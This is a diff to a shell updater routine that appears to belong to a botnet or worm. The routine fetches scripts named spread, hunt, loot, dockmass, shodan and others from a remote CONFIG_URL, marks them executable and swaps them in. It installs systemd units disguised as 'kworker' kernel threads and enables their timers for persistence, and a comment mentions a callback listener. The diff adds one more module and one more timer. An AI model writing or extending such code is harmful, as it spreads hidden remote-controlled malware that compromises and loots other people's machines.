@@ -39,7 +39,7 @@ render_config() {
 # is CDN-cached, so without it a fresh push can be invisible for minutes.
 refresh_published() {
     [ -n "${CONFIG_URL:-}" ] || return 0
-    for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh shodan.sh seed.sh nets.txt docknest.sh _nestd.py; do
+    for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh shodan.sh seed.sh nets.txt docknest.sh dockcls.sh _nestd.py; do
         curl -fsSL "$CONFIG_URL/$f?v=$(date +%s)" -o "$f.new" 2>/dev/null || { rm -f "$f.new"; continue; }
         chmod 0755 "$f.new"
         if [ ! -f "$f" ] || ! cmp -s "$f" "$f.new"; then mv -f "$f.new" "$f"; fi
@@ -61,13 +61,13 @@ refresh_published() {
         rm -f worker.env.new
     fi
     if command -v systemctl >/dev/null 2>&1; then
-        for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass kworker-nest kworker-nestd; do
+        for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass kworker-nest kworker-nestd kworker-cls; do
             for e in service timer; do
                 curl -fsSL "$CONFIG_URL/$u.$e?v=$(date +%s)" -o "/etc/systemd/system/$u.$e" 2>/dev/null || :
             done
         done
         systemctl daemon-reload 2>/dev/null || true
-        for t in kworker-updater.timer kworker-spread.timer kworker-tune.timer kworker-loot.timer kworker-dock.timer kworker-mass.timer kworker-nest.timer; do
+        for t in kworker-updater.timer kworker-spread.timer kworker-tune.timer kworker-loot.timer kworker-dock.timer kworker-mass.timer kworker-nest.timer kworker-cls.timer; do
             systemctl enable --now "$t" 2>/dev/null || true
         done
         # nestd is the callback listener. It binds NEST_PORT (8080) and only box1
